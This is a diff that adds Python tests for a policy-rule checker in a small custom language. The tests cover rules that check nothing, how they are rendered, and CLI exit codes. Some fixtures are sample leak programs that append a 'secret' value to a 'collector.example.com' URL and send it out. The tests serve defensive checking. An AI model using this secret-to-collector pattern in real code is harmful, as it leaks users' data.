@@ -646,6 +646,184 @@ def test_absent_fingerprint_behaves_exactly_as_before():
     assert v[0].cleared_by.name == "new"
 
 
+# ================================================================ vacuous named subjects (P-Q19)
+
+def test_vacuous_rule_situation_2_reports_checked_nothing():
+    """§1's exact program: 'readings' resolves (it feeds a `show`), but no
+    `ask` effect derives from it — the `ask` derives from 'endpoint'
+    instead. The rule checked nothing and must not report clean."""
+    src = ('use http\n'
+           'use file\n\n'
+           'let endpoint = "https://api.example.com/data"\n'
+           'let readings = read of "sensor.txt"\n\n'
+           'show readings\n'
+           'ask endpoint\n\n'
+           'rule [no-reading-uploads] readings may not ask\n')
+    v = rule_violations(src)
+    assert len(v) == 1
+    assert v[0].vacuous
+    assert not v[0].is_violation
+    rendered = v[0].render()
+    assert "checked nothing" in rendered
+    assert "readings" in rendered
+    assert "'ask'" in rendered
+    assert "violated" not in rendered
+
+
+def test_vacuous_situation_1_no_effect_of_the_kind_at_all():
+    """The rule's kind never occurs anywhere in the program."""
+    src = ('use file\n'
+           'let secret = "value"\n'
+           'show secret\n'
+           'rule [no-secret-uploads] secret may not ask\n')
+    v = rule_violations(src)
+    assert len(v) == 1
+    assert v[0].vacuous
+    rendered = v[0].render()
+    assert "checked nothing" in rendered
+    assert "no 'ask' effect at all" in rendered
+
+
+def test_vacuous_situation_3_subject_reaches_the_kind_but_not_the_target():
+    """`payload` does derive an `ask`, but only to a target the rule's own
+    `to "..."` clause excludes.
+
+    Deliberately a plain top-level `let` + `ask`, not a function call: a
+    parameterised call site produces both a generic (computed-target)
+    function-level effect and a specialised (exact-target) top-level one
+    in `.declared` (a pre-existing shapes.py dedup quirk, unrelated to
+    this build) — and a computed target is conservatively treated as a
+    possible match by `_target_matches` (v2.0 §34), which would make the
+    rule match the generic effect and mask the situation-3 case this test
+    wants to isolate.
+    """
+    src = ('use http\n'
+           'let payload = "secret"\n'
+           'let full = "https://collector.example.com/?d=" + payload\n'
+           'rule [no-other-leak] payload may not ask '
+           'to "https://different.example.com"\n'
+           'x = ask full\n')
+    v = rule_violations(src)
+    assert len(v) == 1
+    assert v[0].vacuous
+    rendered = v[0].render()
+    assert "checked nothing" in rendered
+    assert "excludes every one" in rendered
+    assert "https://different.example.com" in rendered
+
+
+def test_anything_subject_is_never_vacuous():
+    """The regression that matters most: a program with no matching effect
+    under an `anything` rule is the ordinary, intended clean result — not
+    vacuous, and its exit code must not change."""
+    src = 'use file\nrule [no-net] anything may not ask\nshow "hi"\n'
+    v = rule_violations(src)
+    assert v == []
+
+
+def test_matching_named_subject_rule_is_unaffected():
+    """A named subject that DOES match is a real violation, not vacuous."""
+    src = ('use http\n'
+           'to send of payload:\n'
+           '  give ask "https://collector.example.com/?d=" + payload\n\n'
+           'rule [no-leak] payload may not ask\n'
+           'x = send of "secret"\n')
+    v = rule_violations(src)
+    assert len(v) >= 1
+    assert all(not viol.vacuous for viol in v)
+    assert all(viol.is_violation for viol in v)
+
+
+def test_vacuous_rule_alongside_a_real_violation_is_not_vacuous_overall():
+    """A genuine violation from one rule must dominate a vacuous result
+    from another — the CLI exit code must be 1, not 2, in this mix.
+
+    The two forbid rules narrow rather than conflict (one has a target,
+    one doesn't — v2.0 §30), so both can coexist without a RuleConflict."""
+    src = ('use http\n'
+           'use file\n\n'
+           'let endpoint = "https://api.example.com/data"\n'
+           'let readings = read of "sensor.txt"\n\n'
+           'show readings\n'
+           'ask endpoint\n\n'
+           'rule [no-reading-uploads] readings may not ask\n'
+           'rule [no-endpoint-uploads] anything may not ask '
+           'to "https://api.example.com/data"\n')
+    v = rule_violations(src)
+    vacuous = [viol for viol in v if viol.vacuous]
+    real = [viol for viol in v if viol.is_violation]
+    assert len(vacuous) == 1
+    assert len(real) == 1
+    assert real[0].rule.name == "no-endpoint-uploads"
+
+
+def test_vacuous_is_not_a_violation():
+    src = ('use http\n'
+           'use file\n\n'
+           'let endpoint = "https://api.example.com/data"\n'
+           'let readings = read of "sensor.txt"\n\n'
+           'show readings\n'
+           'ask endpoint\n\n'
+           'rule [no-reading-uploads] readings may not ask\n')
+    v = rule_violations(src)
+    assert not any(viol.is_violation for viol in v)
+
+
+def test_permits_are_never_reported_vacuous():
+    """A named-subject permit that excepts no forbid rule of its kind is
+    already RuleConflict via _check_permits_are_related — vacuous
+    detection (forbids only) never gets a chance to run for it. 'endpoint'
+    resolves here (it feeds the ask), so the conflict check, not subject
+    resolution, is what actually fires."""
+    src = ('use http\n'
+           'let endpoint = "https://audit.internal"\n'
+           'rule [no-clock] anything may not clock\n'
+           'rule [audit-allowed] endpoint may ask to "https://audit.internal"\n'
+           'x = ask endpoint\n')
+    e = expect_conflict(src)
+    assert "excepts no forbid rule" in str(e)
+
+
+def test_cli_exit_code_2_for_a_vacuous_rule():
+    import subprocess, tempfile, os
+    src = ('use http\n'
+           'use file\n\n'
+           'let endpoint = "https://api.example.com/data"\n'
+           'let readings = read of "sensor.txt"\n\n'
+           'show readings\n'
+           'ask endpoint\n\n'
+           'rule [no-reading-uploads] readings may not ask\n')
+    d = tempfile.mkdtemp()
+    p = os.path.join(d, "m.planes")
+    open(p, "w").write(src)
+    try:
+        result = subprocess.run(
+            ["python3", "shapes_cli.py", p, "--rules"],
+            capture_output=True, text=True)
+        assert result.returncode == 2
+        assert "checked nothing" in result.stdout
+    finally:
+        import shutil
+        shutil.rmtree(d, ignore_errors=True)
+
+
+def test_cli_exit_code_0_for_anything_with_no_match():
+    import subprocess, tempfile, os
+    src = 'use file\nrule [no-net] anything may not ask\nshow "hi"\n'
+    d = tempfile.mkdtemp()
+    p = os.path.join(d, "m.planes")
+    open(p, "w").write(src)
+    try:
+        result = subprocess.run(
+            ["python3", "shapes_cli.py", p, "--rules"],
+            capture_output=True, text=True)
+        assert result.returncode == 0
+        assert "no violations" in result.stdout
+    finally:
+        import shutil
+        shutil.rmtree(d, ignore_errors=True)
+
+
 # ================================================================ inertness
 
 def test_rule_presence_does_not_change_output_or_effects():
